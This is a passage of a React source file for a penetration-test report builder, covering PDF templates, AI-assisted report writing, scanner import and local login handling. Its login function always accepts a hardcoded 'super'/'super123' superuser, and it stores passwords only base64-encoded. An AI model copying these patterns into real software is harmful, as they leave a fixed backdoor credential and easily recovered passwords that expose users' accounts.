<div style="position:absolute;bottom:15px;left:40px;right:40px;border-top:1px solid ${th.border};padding-top:6px;text-align:center;font-size:7px;color:${th.muted};">${esc(d.footerText)}</div>
</div>
<div class="pg pb">
<div class="sh"><h2>1. Executive Summary</h2></div>
<p style="font-size:9.5px;line-height:1.7;margin-bottom:12px;">${esc(d.execSummary)||"Assessment conducted by the CyberSec Operations team. "+F.length+" vulnerabilities identified."}</p>
${d.keyObs ? '<div style="padding:10px 14px;background:'+th.card+';border-left:3px solid '+th.accent+';border-radius:4px;margin-bottom:12px;"><div style="color:'+th.accent+';font-size:8px;font-weight:bold;margin-bottom:5px;font-family:monospace;">KEY OBSERVATIONS</div><p style="font-size:9px;line-height:1.6;white-space:pre-line;">'+esc(d.keyObs)+'</p></div>' : ""}
${d.businessImpact ? '<div style="padding:10px 14px;background:'+th.card+';border-left:3px solid #FF6D00;border-radius:4px;"><div style="color:#FF6D00;font-size:8px;font-weight:bold;margin-bottom:5px;font-family:monospace;">BUSINESS IMPACT</div><p style="font-size:9px;line-height:1.6;">'+esc(d.businessImpact)+'</p></div>' : ""}
</div>
<div class="pg pb">
<div class="sh"><h2>2. Scope &amp; Methodology</h2></div>
<table class="dt" style="margin-bottom:16px;">
<thead><tr><th>Asset</th><th>IP / URL</th><th>Type</th><th>Environment</th><th>Method</th><th>Status</th></tr></thead>
<tbody>${assetRows}</tbody>
</table>
<div style="font-size:11px;font-weight:bold;margin:14px 0 8px;">Assessment Phases</div>
${phaseHTML}
</div>
<div class="pg pb">
<div class="sh"><h2>3. Vulnerability Summary</h2></div>
<table class="dt">
<thead><tr><th>ID</th><th>Vulnerability</th><th>CVE</th><th>CVSS</th><th>Severity</th><th>OWASP</th><th>Status</th></tr></thead>
<tbody>${summaryRows}</tbody>
</table>
</div>
<div class="pg pb">
<div class="sh"><h2>4. Tracker &amp; Analytics Dashboard</h2></div>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:16px;">
${[["Total Findings",F.length,th.accent],["Closed",xClosed,"#00E676"],["Open",xOpen,"#FF6D00"],["Progress",(F.length?Math.round((xClosed/F.length)*100):0)+"%","#FFD600"]].map(([lbl,val,c])=>
  '<div style="text-align:center;padding:10px 6px;background:'+th.card+';border-radius:6px;border:1px solid '+th.border+';"><div style="font-size:18px;font-weight:900;color:'+c+';">'+val+'</div><div style="font-size:7.5px;font-weight:bold;color:'+th.muted+';text-transform:uppercase;margin-top:2px;">'+lbl+'</div></div>'
).join("")}
</div>
<div style="font-size:10px;font-weight:bold;margin-bottom:8px;color:${th.text};">Severity Distribution</div>
${[["Critical",cnt.Critical],["High",cnt.High],["Medium",cnt.Medium],["Low",cnt.Low],["Info",cnt.Info]].filter(([,v])=>v>0).map(([s,v])=>{
  const pct = F.length ? Math.round((v/F.length)*100) : 0;
  return '<div class="barrow"><div class="barlabel">'+s+'</div><div class="bartrack"><div class="barfill" style="width:'+pct+'%;background:'+SEV_COLOR[s]+';"></div></div><div class="barval">'+v+'</div></div>';
}).join("")}
<div style="font-size:10px;font-weight:bold;margin:18px 0 8px;color:${th.text};">CVSS Score by Finding</div>
${F.map(f=>{ const sc=parseFloat(f.cvssScore)||0; const sclr=SEV_COLOR[f.severity]||"#8892A4";
  return '<div class="barrow"><div class="barlabel" style="width:140px;">'+esc((f.title||"").slice(0,18))+'</div><div class="bartrack"><div class="barfill" style="width:'+(sc*10)+'%;background:'+sclr+';"></div></div><div class="barval">'+sc.toFixed(1)+'</div></div>';
}).join("")}
<div style="font-size:10px;font-weight:bold;margin:18px 0 8px;color:${th.text};">Status Breakdown (Retest Pipeline)</div>
${STATUS_FLOW.map(s=>{ const v=F.filter(f=>f.status===s).length; const pct=F.length?Math.round((v/F.length)*100):0;
  return '<div class="barrow"><div class="barlabel">'+s+'</div><div class="bartrack"><div class="barfill" style="width:'+pct+'%;background:'+STATUS_COLOR[s]+';"></div></div><div class="barval">'+v+'</div></div>';
}).join("")}
</div>
<div class="pg pb">
<div class="sh"><h2>5. Detailed Findings</h2></div>
${findingRows}
</div>
<div class="pg pb">
<div class="sh"><h2>6. Remediation Roadmap</h2></div>
<table class="dt">
<thead><tr><th>Priority</th><th>Finding</th><th>CVSS</th><th>SLA</th><th>Owner</th><th>Action</th></tr></thead>
<tbody>${roadRows}</tbody>
</table>
</div>
<div class="pg pb">
<div class="sh"><h2>7. Conclusion &amp; Sign-off</h2></div>
<p style="font-size:9.5px;line-height:1.7;margin-bottom:14px;">${esc(d.conclusion.text)||"Immediate remediation of all Critical and High findings is strongly recommended."}</p>
<div style="font-size:11px;font-weight:bold;margin:14px 0 8px;">Sign-Off</div>
<table class="dt"><thead><tr><th>Role</th><th>Name</th><th>Signature</th><th>Date</th></tr></thead><tbody>${signRows}</tbody></table>
<div style="margin-top:20px;padding:10px;border-top:2px solid ${th.accent};text-align:center;">
<p style="font-size:7.5px;color:${th.muted};">This report contains sensitive security information. Distribution is restricted to authorised personnel only.</p>
<p style="font-size:7.5px;color:${th.muted};margin-top:3px;">${esc(d.footerText)}</p>
</div>
</div>
</body></html>`;
}

function buildEvidenceHTML(f, i, th) {
  const ev = f.evidence||[];
  if(!ev.length) return "";
  const imgCells = ev.map((e,ei)=>{
    const sclr = SEV_COLOR[f.severity]||"#8892A4";
    return [
      '<div style="border:1px solid '+th.border+';border-radius:8px;overflow:hidden;background:'+th.card+';">',
      '<img src="'+e.data+'" alt="Fig '+(i+1)+'.'+(ei+1)+'" style="width:100%;height:180px;object-fit:cover;display:block;"/>',
      '<div style="padding:6px 10px;background:'+th.surf+';border-top:1px solid '+th.border+';">',
      '<div style="display:flex;justify-content:space-between;align-items:center;">',
      '<span style="font-size:8px;font-weight:bold;color:'+th.accent+';font-family:monospace;">Fig '+(i+1)+'.'+(ei+1)+'</span>',
      '<span style="font-size:7px;color:'+th.muted+';font-family:monospace;">'+esc(e.name||"")+'</span>',
      '</div>',
      e.caption ? '<div style="font-size:8.5px;color:'+th.text+';margin-top:3px;line-height:1.4;">'+esc(e.caption)+'</div>' : "",
      '</div></div>'
    ].join("");
  }).join("");
  return [
    '<div style="border-top:2px solid '+(SEV_COLOR[f.severity]||"#8892A4")+'44;padding:12px 14px;background:'+th.bg+';">',
    '<div style="font-size:8px;font-weight:bold;color:'+th.accent+';font-family:monospace;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px;">',
    '📸 EVIDENCE &amp; SCREENSHOTS ('+ev.length+' file'+(ev.length>1?"s":"")+')',
    '</div>',
    '<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:12px;">',
    imgCells,
    '</div>',
    f.attachNote ? '<div style="margin-top:10px;padding:7px 10px;background:'+th.card+';border-left:3px solid '+th.accent+';border-radius:4px;font-size:8px;color:'+th.muted+';">'+esc(f.attachNote)+'</div>' : "",
    '</div>'
  ].join("");
}

// ── AI HELPER ────────────────────────────────────────────────────────────────
// Set AI_PROVIDER to "claude" (works free, no key, only inside claude.ai artifacts)
// or "gemini" (works anywhere incl. local — needs your own free API key below).
const AI_PROVIDER     = "gemini";                 // "claude" | "gemini"
const GEMINI_API_KEY  = "PASTE_YOUR_GEMINI_KEY_HERE"; // get free at https://aistudio.google.com/apikey
const GEMINI_MODEL    = "gemini-2.0-flash";

async function aiCall(messages, tokens=1200) {
  if (AI_PROVIDER === "gemini") {
    const userText = messages.map(m=>m.content).join("\n");
    const r = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`,
      {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({
          contents:[{ parts:[{ text:userText }] }],
          generationConfig:{ maxOutputTokens: tokens },
        }),
      }
    );
    const d = await r.json();
    if (d.error) throw new Error(d.error.message);
    return d.candidates?.[0]?.content?.parts?.map(p=>p.text).join("") || "";
  }
  // Claude — only works inside claude.ai artifacts (no key needed there)
  const r = await fetch("https://api.anthropic.com/v1/messages", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body:JSON.stringify({ model:"claude-sonnet-4-6", max_tokens:tokens, messages }),
  });
  const d = await r.json();
  if(d.error) throw new Error(d.error.message);
  return d.content.filter(b=>b.type==="text").map(b=>b.text).join("");
}

// Vision call — used by AI Remediation Validation (screenshot → Fixed/Partially Fixed/Not Fixed)
async function aiVisionCall(base64DataUrl, prompt, tokens=300) {
  const [, mime="image/png", data=""] = base64DataUrl.match(/^data:(.*?);base64,(.*)$/) || [];
  if (AI_PROVIDER === "gemini") {
    const r = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`,
      { method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ contents:[{ parts:[{ text:prompt }, { inline_data:{ mime_type:mime, data } }] }], generationConfig:{ maxOutputTokens: tokens } }) }
    );
    const d = await r.json();
    if (d.error) throw new Error(d.error.message);
    return d.candidates?.[0]?.content?.parts?.map(p=>p.text).join("") || "";
  }
  const r = await fetch("https://api.anthropic.com/v1/messages", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ model:"claude-sonnet-4-6", max_tokens:tokens,
      messages:[{ role:"user", content:[{ type:"image", source:{ type:"base64", media_type:mime, data } }, { type:"text", text:prompt }] }] }),
  });
  const d = await r.json();
  if(d.error) throw new Error(d.error.message);
  return d.content.filter(b=>b.type==="text").map(b=>b.text).join("");
}


export default function App() {
  const [tab,       setTab]       = useState("cover");
  const [data,      setData]      = useState(INIT_DATA());
  const [history,   setHistory]   = useState([]);
  const [fTab,      setFTab]      = useState(0);
  const [fSubTab,   setFSubTab]   = useState("details");
  const [exporting, setExporting] = useState(false);
  const [exportMsg, setExportMsg] = useState("");
  const [toast,     setToast]     = useState({msg:"",type:"info"});
  const [aiPanel,   setAiPanel]   = useState({open:false,loading:false,enhancing:false,mode:"technical",field:"",idx:null,result:"",enhance:"",history:[]});
  const [libModal,  setLibModal]  = useState({open:false,search:""});
  const [lightbox,  setLightbox]  = useState(null);
  const [cveLook,   setCveLook]   = useState({});
  const [genLoading,setGenLoading]= useState(false);     // lifted from FDetails
  const [evStage,   setEvStage]   = useState("Before Fix"); // lifted from FEvidence
  const [dragOver,  setDragOver]  = useState(false);     // lifted from TabImport
  // ── Auth ──
  const [authUser,    setAuthUser]    = useState(null); // {username,role} or null = logged out
  const [sysUsers,    setSysUsers]    = useState([]);
  const [sysAudit,    setSysAudit]    = useState([]);
  const [loginForm,   setLoginForm]   = useState({username:"",password:"",error:""});

  // Credentials are base64-encoded before touching storage (not real encryption, but no plaintext on disk)
  const b64        = s => btoa(unescape(encodeURIComponent(s||"")));
  const unb64      = s => { try { return decodeURIComponent(escape(atob(s||""))); } catch { return s||""; } };
  const encUsers   = arr => arr.map(u=>({...u, username:b64(u.username), password:b64(u.password)}));
  const decUsers   = arr => arr.map(u=>({...u, username:unb64(u.username), password:unb64(u.password)}));
  const persistUsers = arr => store.set("vapt-auth-users", JSON.stringify(encUsers(arr)));

  useEffect(()=>{
    store.get("vapt-history").then(r=>{ if(r) try{ setHistory(JSON.parse(r.value)); }catch{} });
    store.get("vapt-auth-users").then(r=>{
      if(r){ try{ setSysUsers(decUsers(JSON.parse(r.value))); return; }catch{} }
      const seed=[{_id:uid(),username:"super",password:"super123",role:"superuser"}];
      setSysUsers(seed); persistUsers(seed);
    });
    fetch(AUDIT_BASE).then(r=>r.json()).then(d=>{
      const parsed = (d.lines||[]).map(l=>{ const [ts,user,...rest]=l.split("|"); return {_id:uid(),ts,user,action:rest.join("|")}; }).reverse();
      if(parsed.length) setSysAudit(parsed);
    }).catch(()=>{
      store.get("vapt-system-audit").then(r=>{ if(r) try{ setSysAudit(JSON.parse(r.value)); }catch{} });
    });
  },[]);

  // ── JSON file DB: manual export/import for true cross-session persistence ──
  const exportDB = () => {
    const db = { sysUsers:encUsers(sysUsers), history, sysAudit, exportedAt:new Date().toISOString() };
    const blob = new Blob([JSON.stringify(db,null,2)], {type:"application/json"});
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href=url; a.download="vaptpro_database.json"; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
    systemAudit("Database exported to JSON file");
    notify("📦 Database exported as vaptpro_database.json","success");
  };
  const importDB = file => {
    if(!file) return;
    const r = new FileReader();
    r.onload = e => {
      try {
        const db = JSON.parse(e.target.result);
        if(db.sysUsers){ const u=decUsers(db.sysUsers); setSysUsers(u); persistUsers(u); }
        if(db.history){ setHistory(db.history); store.set("vapt-history",JSON.stringify(db.history)); }
        if(db.sysAudit){ setSysAudit(db.sysAudit); store.set("vapt-system-audit",JSON.stringify(db.sysAudit)); }
        systemAudit("Database imported from JSON file");
        notify("✅ Database imported","success");
      } catch { notify("Invalid database file","error"); }
    };
    r.readAsText(file);
  };

  const systemAudit = (action,user) => {
    const ts = new Date().toLocaleString();
    const u  = user||authUser?.username||"system";
    const entry = {_id:uid(),ts,user:u,action};
    setSysAudit(prev=>[entry,...prev].slice(0,500));
    // Append-only text log (pipe-delimited) — minimal storage, no full-array rewrite each time
    fetch(AUDIT_BASE,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({line:`${ts}|${u}|${action}`})}).catch(()=>{});
    // Fallback for artifact/no-server mode: keep a capped JSON array too
    store.set("vapt-system-audit",JSON.stringify([entry,...sysAudit].slice(0,500)));
  };
  const doLogin = () => {
    const u = sysUsers.find(x=>x.username===loginForm.username && x.password===loginForm.password)
      || (loginForm.username==="super" && loginForm.password==="super123" ? {username:"super",role:"superuser"} : null);
    if(u){ setAuthUser({username:u.username,role:u.role}); setLoginForm({username:"",password:"",error:""}); systemAudit(`Login success (role: ${u.role})`,u.username); setTab(u.role==="user"?"history":"tracker"); }
    else { setLoginForm(f=>({...f,error:"Invalid username or password"})); systemAudit(`Login FAILED for username "${loginForm.username}"`,loginForm.username||"unknown"); }
  };
  const doLogout = () => { systemAudit("Logout"); setAuthUser(null); };
  const addSysUser = () => setSysUsers(prev=>{ const next=[...prev,{_id:uid(),username:"",password:"",role:"user"}]; persistUsers(next); return next; });
  const updSysUser = (id,k,v) => setSysUsers(prev=>{ const next=prev.map(u=>u._id===id?{...u,[k]:v}:u); persistUsers(next); systemAudit(`User "${next.find(u=>u._id===id)?.username||id}" field "${k}" changed`); return next; });
  const delSysUser = id => setSysUsers(prev=>{ const removed=prev.find(u=>u._id===id); const next=prev.filter(u=>u._id!==id); persistUsers(next); systemAudit(`User "${removed?.username}" deleted`); return next; });

  const notify = (msg,type="info") => { setToast({msg,type}); setTimeout(()=>setToast({msg:"",type:"info"}),3500); };
  const upd    = (k,v) => { setData(p=>({...p,[k]:v})); };
  const updCov = (k,v) => upd("cover",{...data.cover,[k]:v});
  const updCon = (k,v) => upd("conclusion",{...data.conclusion,[k]:v});
  const curUser = () => data.users[data.currentUser]?.name || "User";
  const audit = action => upd("auditLog",[{ _id:uid(), action, user:curUser(), ts:new Date().toLocaleString() },...data.auditLog].slice(0,200));
  const updF   = (i,k,v) => { const a=[...data.findings]; a[i]={...a[i],[k]:v}; if(k==="cvssScore") a[i].severity=fromCVSS(v); upd("findings",a); };
  const setFStatus = (i,status) => {
    const a=[...data.findings]; const f=a[i]; const old=f.status;
    a[i]={...f,status,history:[{_id:uid(),from:old,to:status,user:curUser(),ts:new Date().toLocaleString()},...(f.history||[])]};
    upd("findings",a); audit(`Finding ${f.id} status: ${old} → ${status}`);
  };

  // Findings CRUD
  const addFinding = () => { const n=data.findings.length; upd("findings",[...data.findings,newFinding(n)]); setFTab(n); setFSubTab("details"); audit("Finding added"); };
  const delFinding = i => { const f=data.findings[i]; upd("findings",data.findings.filter((_,j)=>j!==i)); setFTab(Math.max(0,i-1)); audit(`Finding ${f?.id||""} deleted`); };
  const moveF      = (i,d_) => { const a=[...data.findings]; const n=i+d_; if(n<0||n>=a.length)return; [a[i],a[n]]=[a[n],a[i]]; upd("findings",a); setFTab(n); };
  const insertLib  = tpl => { const n=data.findings.length; const f={...newFinding(n),...tpl,_id:uid(),id:"VAPT-"+new Date().getFullYear()+"-"+String(n+1).padStart(3,"0")}; upd("findings",[...data.findings,f]); setFTab(n); setFSubTab("details"); setLibModal({open:false,search:""}); notify("Template inserted!","success"); audit("Finding added from library"); };

  // Assets
  const addAsset = () => upd("assets",[...data.assets,{_id:uid(),name:"",ip:"",domain:"",env:"Production",type:"Internal",method:"Grey-Box",status:"In Scope"}]);
  const delAsset = id => upd("assets",data.assets.filter(a=>a._id!==id));
  const updA     = (id,k,v) => upd("assets",data.assets.map(a=>a._id===id?{...a,[k]:v}:a));

  // Evidence (with stage: Before Fix / After Fix / Retest)
  const addEvidence = (fi,file,stage="Before Fix") => {
    if(!file) return;
    const r=new FileReader();
    r.onload = e => { const a=[...data.findings]; a[fi]={...a[fi],evidence:[...(a[fi].evidence||[]),{_id:uid(),data:e.target.result,caption:"",name:file.name,stage}]}; upd("findings",a); };
    r.readAsDataURL(file);
  };
  const delEvidence = (fi,id) => { const a=[...data.findings]; a[fi]={...a[fi],evidence:(a[fi].evidence||[]).filter(e=>e._id!==id)}; upd("findings",a); };
  const updEvCap    = (fi,id,cap) => { const a=[...data.findings]; a[fi]={...a[fi],evidence:(a[fi].evidence||[]).map(e=>e._id===id?{...e,caption:cap}:e)}; upd("findings",a); };
  const updEvStage  = (fi,id,stage) => { const a=[...data.findings]; a[fi]={...a[fi],evidence:(a[fi].evidence||[]).map(e=>e._id===id?{...e,stage}:e)}; upd("findings",a); };

  // Roadmap override
  const updRO = (fid,k,v) => upd("roadmapOverride",{...data.roadmapOverride,[fid]:{...(data.roadmapOverride[fid]||{}),[k]:v}});

  // ── Scanner CSV/XLSX bulk import (Nessus/Nuclei/Qualys/Burp/Acunetix/OpenVAS) ──
  const importScannerFile = file => {
    if(!file) return;
    const finish = rows => {
      const mapped = rows.map(mapScannerRow).filter(Boolean);
      if(!mapped.length){ notify("No recognisable findings in file","error"); return; }
      const start = data.findings.length;
      const newF_ = mapped.map((m,i)=>({...newFinding(start+i), ...m}));
      upd("findings",[...data.findings,...newF_]);
      audit(`Imported ${newF_.length} findings from ${file.name}`);
      notify(`✅ Imported ${newF_.length} findings from ${file.name}`,"success");
    };
    const ext = file.name.split(".").pop().toLowerCase();
    if(ext==="csv"){
      Papa.parse(file,{header:true,skipEmptyLines:true,complete:res=>finish(res.data)});
    } else {
      const r=new FileReader();
      r.onload = e => {
        const wb = XLSX.read(e.target.result,{type:"array"});
        const ws = wb.Sheets[wb.SheetNames[0]];
        finish(XLSX.utils.sheet_to_json(ws));
      };
      r.readAsArrayBuffer(file);
    }
  };

  // ── XLSX Export — full findings register ──
  const exportXLSX = () => {
    const rows = data.findings.map(f=>({
      ID:f.id, Title:f.title, Severity:f.severity, Status:f.status, CVSS:f.cvssScore, CVE:f.cve,
      Asset:f.asset, Description:f.description, Impact:f.impact, Remediation:f.remediation,
      OWASP:f.owasp, CWE:f.cwe, References:f.references,
    }));
    const ws = XLSX.utils.json_to_sheet(rows);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb,ws,"Findings");
    XLSX.writeFile(wb,"VAPT_Findings_"+(data.cover.org||"Report").replace(/\s+/g,"_")+".xlsx");
    audit("Exported findings to XLSX");
    notify("✅ XLSX downloaded","success");
  };

  // ── Version bump ──
  const bumpVersion = type => {
    const cur = data.versionNum||"v1.0";
    const m = cur.match(/v(\d+)\.(\d+)/); let major=m?+m[1]:1, minor=m?+m[2]:0;
    if(type==="major"){ major+=1; minor=0; } else { minor+=1; }
    const next = `v${major}.${minor}`;
    upd("versionHistory",[{ver:cur,date:new Date().toLocaleString(),stage:data.approvalStage},...data.versionHistory]);
    upd("versionNum",next);
    updCov("version",next);
    audit(`Version bumped ${cur} → ${next}`);
    notify("Version bumped to "+next,"success");
  };

  // ── Approval workflow ──
  const advanceApproval = () => {
    const i = APPROVAL_FLOW.indexOf(data.approvalStage);
    const next = APPROVAL_FLOW[Math.min(i+1,APPROVAL_FLOW.length-1)];
    upd("approvalStage",next);
    audit(`Report stage: ${data.approvalStage} → ${next}`);
    notify("Report moved to: "+next,"success");
  };

  // ── AI PoC Generator — full finding from just a title ──
  const aiGenerateFinding = async title => {
    const prompt = `You are a senior penetration tester. For the vulnerability "${title}", return ONLY valid JSON (no markdown) with keys: description, impact, poc, remediation, references (array of 2 url strings), cvssScore (number), severity (Critical/High/Medium/Low), owasp (e.g. A03:2021), cwe (e.g. CWE-89). Be specific and professional.`;
    const raw = await aiCall([{role:"user",content:prompt}], 1200);
    return JSON.parse(raw.replace(/```json|```/g,"").trim());
  };

  // ── #13 AI Root Cause Generator ──
  const aiRootCause = async fi => {
    const f = data.findings[fi];
    const prompt = `In 1-2 sentences, state the underlying ROOT CAUSE (not the symptom) of this vulnerability: "${f.title}". Description: "${f.description||"N/A"}". Format as plain text starting with the root cause itself, no preamble, no markdown.`;
    const text = await aiCall([{role:"user",content:prompt}], 250);
    updF(fi,"rootCause",text.trim());
    notify("🤖 Root cause generated","success");
  };

  // ── #15 AI Attack Narrative Generator ──
  const aiAttackNarrative = async fi => {
    const f = data.findings[fi];
    const prompt = `Write a single-paragraph attack narrative (management-friendly, non-technical) describing how an attacker exploited this vulnerability and what they achieved. Vulnerability: "${f.title}". Impact: "${f.impact||"N/A"}". Asset: "${f.asset||"N/A"}". Style example: "An attacker exploited SQL Injection to gain database access and extract customer records." Plain text only, no markdown.`;
    const text = await aiCall([{role:"user",content:prompt}], 300);
    updF(fi,"attackNarrative",text.trim());
    notify("🤖 Attack narrative generated","success");
  };

  // ── #14 AI Remediation Validation — analyzes an evidence screenshot ──
  const aiValidateEvidence = async (fi,evId) => {
    const f = data.findings[fi]; const ev = (f.evidence||[]).find(e=>e._id===evId);
    if(!ev) return;
    notify("🤖 Validating screenshot...","info");
    try {
      const prompt = `You are a penetration tester reviewing remediation evidence for the vulnerability "${f.title}". Look at this screenshot and respond with EXACTLY ONE of these three labels followed by a colon and a one-sentence reason: "Fixed:", "Partially Fixed:", or "Not Fixed:". Base your judgement only on what is visible in the image.`;
      const result = await aiVisionCall(ev.data, prompt, 200);
      const arr=[...data.findings]; arr[fi]={...arr[fi], evidence: arr[fi].evidence.map(e=>e._id===evId?{...e, aiValidation:result.trim()}:e)};
      upd("findings",arr);
      notify("✅ AI validation complete","success");
    } catch(e){ notify("Validation failed: "+e.message,"error"); }
  };

  // CVE Lookup
  const lookupCVE = async fi => {
    const cve = data.findings[fi]?.cve;
    if(!cve||cve==="N/A"){ notify("Enter a valid CVE ID first","error"); return; }
    setCveLook(p=>({...p,[fi]:{loading:true}}));
    try {
      const raw = await aiCall([{role:"user",content:`Search NVD for ${cve} and return ONLY valid JSON (no markdown) with these keys: description (string), cvssScore (number 0-10), cvssVector (CVSS:3.1/... string), severity (Critical/High/Medium/Low), cwe (e.g. CWE-79), references (array of 2 URL strings).`}], 600);
      const parsed = JSON.parse(raw.replace(/```json|```/g,"").trim());
      const a=[...data.findings];
      a[fi]={...a[fi], description:parsed.description||a[fi].description, cvssScore:String(parsed.cvssScore||a[fi].cvssScore), cvssVector:parsed.cvssVector||a[fi].cvssVector, severity:parsed.severity||fromCVSS(parsed.cvssScore)||a[fi].severity, cwe:parsed.cwe||a[fi].cwe, references:(parsed.references||[]).join("\n")||a[fi].references };
      upd("findings",a); notify("CVE data populated!","success");
    } catch(e){ notify("Lookup failed: "+e.message,"error"); }
    finally { setCveLook(p=>({...p,[fi]:{loading:false}})); }
  };

  // AI
  const openAI  = (field,idx=null) => setAiPanel({open:true,loading:false,enhancing:false,mode:"technical",field,idx,result:"",enhance:"",history:[]});
  const runAI   = async () => {
    setAiPanel(p=>({...p,loading:true,result:""}));
    try {
      const f = aiPanel.idx!==null ? data.findings[aiPanel.idx] : null;
      let prompt = "";
      if(aiPanel.field==="execSummary"){
        const cnt=data.findings.reduce((a,x)=>{ a[x.severity]=(a[x.severity]||0)+1; return a; },{Critical:0,High:0,Medium:0,Low:0});
        prompt = `Write a professional 2-3 paragraph executive summary for a VAPT report. Org: "${data.cover.org||"the organisation"}". Period: ${data.cover.start||"—"} to ${data.cover.end||"—"}. Findings: ${data.findings.length} total (${cnt.Critical} Critical, ${cnt.High} High, ${cnt.Medium} Medium, ${cnt.Low} Low). Top issues: ${data.findings.slice(0,3).map(x=>x.title).join(", ")||"various vulnerabilities"}. C-suite audience. No markdown.`;
      } else if(aiPanel.field==="keyObs"){
        prompt = `Write 5-6 key observations as bullet points (starting with •) for a VAPT report. Findings: ${data.findings.map(x=>x.severity+": "+x.title).join(", ")||"various issues"}. Each bullet: one concise sentence.`;
      } else if(aiPanel.field==="riskAnalysis"){
        prompt = `Write a 3-4 sentence risk analysis for a VAPT report. Org: "${data.cover.org||"the organisation"}". Critical findings: ${data.findings.filter(x=>x.severity==="Critical").map(x=>x.title).join(", ")||"none"}. Professional tone. No markdown.`;
      } else if(f && ["description","impact","remediation"].includes(aiPanel.field)){
        const modeMap = {technical:"in-depth for security engineers",management:"non-technical for C-suite management",compliance:"for auditors referencing security standards"};
        prompt = `Rewrite this VAPT finding ${aiPanel.field} ${modeMap[aiPanel.mode]||""} for: "${f.title}" (CVSS: ${f.cvssScore}, ${f.severity}). Current: "${f[aiPanel.field]||"(none yet)"}". 2-3 professional sentences. No markdown headers.`;
      } else {
        // Generic polish — works for ANY field (poc, references, retestNote, attachNote, conclusion text, asset notes, etc.)
        const current = aiPanel.field==="conclusionText" ? data.conclusion.text : f ? (f[aiPanel.field]||"") : (data[aiPanel.field]||"");
        prompt = `Polish and professionally rewrite the following VAPT report text. Fix grammar, improve clarity, keep it concise and technically accurate. Do not add markdown, headers, or preamble — output only the improved text.\n\nCurrent text:\n"${current||"(empty — write a suitable professional placeholder for a VAPT report field named '"+aiPanel.field+"')"}"`;
      }
      if(!prompt){ setAiPanel(p=>({...p,loading:false})); return; }
      const result = await aiCall([{role:"user",content:prompt}]);
      setAiPanel(p=>({...p,loading:false,result}));
    } catch(e){ setAiPanel(p=>({...p,loading:false})); notify("AI error: "+e.message,"error"); }
  };
  const runEnhance = async () => {
    if(!aiPanel.enhance.trim()||!aiPanel.result) return;
    setAiPanel(p=>({...p,enhancing:true,history:[p.result,...p.history].slice(0,5)}));
    try {
      const prompt = `You are a professional security report writer. Current content:\n\n"${aiPanel.result}"\n\nUser instruction: "${aiPanel.enhance.trim()}"\n\nRewrite strictly following the instruction. Same professional security context. Output ONLY the improved content, no preamble.`;
      const result = await aiCall([{role:"user",content:prompt}]);
      setAiPanel(p=>({...p,enhancing:false,result,enhance:""}));
    } catch(e){ setAiPanel(p=>({...p,enhancing:false})); notify("Enhancement failed","error"); }
  };
  const applyAI = () => {
    if(!aiPanel.result) return;
    if(aiPanel.field==="conclusionText") updCon("text",aiPanel.result);
    else if(aiPanel.idx!==null) updF(aiPanel.idx,aiPanel.field,aiPanel.result);
    else upd(aiPanel.field,aiPanel.result);
    setAiPanel(p=>({...p,open:false}));
    notify("AI content applied!","success");
  };

  // PDF Export — real new tab (full browser permissions) + auto-print.
  // Choosing "Save as PDF" in the print dialog sends the file straight to the
  // Windows Downloads folder. If the popup is blocked, falls back to a direct
  // .html file download (guaranteed to work, openable in any browser).
  const loadScript = src => new Promise((res,rej)=>{
    if(document.querySelector('script[src="'+src+'"]')){ res(); return; }
    const s=document.createElement("script"); s.src=src; s.onload=res; s.onerror=()=>rej(new Error("script load failed"));
    document.head.appendChild(s);
  });

  const exportPDF = async () => {
    if(exporting) return;
    setExporting(true);
    setExportMsg("Building report...");
    const th = data.useCustom
      ? {...THEMES[data.themeId]||THEMES.dark, bg:data.customBg||THEMES.dark.bg, accent:data.customAccent||THEMES.dark.accent, text:data.customText||THEMES.dark.text}
      : (THEMES[data.themeId]||THEMES.dark);
    const html = buildPDF(data, th);
    const fname = "VAPT_Report_"+(data.cover.org||"Report").replace(/\s+/g,"_")+"_"+(data.cover.date||new Date().toISOString().slice(0,10));

    try {
      // ── Try real binary PDF via jsPDF + html2canvas ──────────────────────
      setExportMsg("Loading PDF engine...");
      await Promise.all([
        loadScript("https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"),
        loadScript("https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"),
      ]);

      setExportMsg("Rendering pages...");
      const RENDER_W = 1000; // crisp text at this capture width
      const frame = document.createElement("iframe");
      frame.style.cssText = "position:fixed;left:-99999px;top:0;width:"+RENDER_W+"px;height:1200px;border:0;";
      document.body.appendChild(frame);
      frame.srcdoc = html;
      await new Promise(res=>{ frame.onload=res; setTimeout(res,1500); });
      await new Promise(res=>setTimeout(res,500)); // settle images/fonts

      const fdoc = frame.contentDocument;
      const pages = fdoc.querySelectorAll(".pg");
      if(!pages.length) throw new Error("no pages found");

      const { jsPDF } = window.jspdf;
      const pdf = new jsPDF({ orientation:"p", unit:"mm", format:"a4", compress:true });
      const A4_W = 210, A4_H = 297;

      for(let i=0;i<pages.length;i++){
        setExportMsg("Capturing page "+(i+1)+" of "+pages.length+"...");
        const canvas = await window.html2canvas(pages[i], { scale:2, useCORS:true, allowTaint:true, backgroundColor:th.bg, width:RENDER_W, windowWidth:RENDER_W, logging:false });
        const imgData = canvas.toDataURL("image/jpeg",0.95);
        const ratio = canvas.height/canvas.width;
        let h_mm = A4_W*ratio;
        if(i>0) pdf.addPage();
        if(h_mm<=A4_H+1){
          const yOff = 0;
          pdf.addImage(imgData,"JPEG",0,yOff,A4_W,h_mm);
        } else {
          // taller than one A4 page: scale down to fit one page (keeps everything on a single page, avoids cropping)
          const scaleDown = A4_H/h_mm;
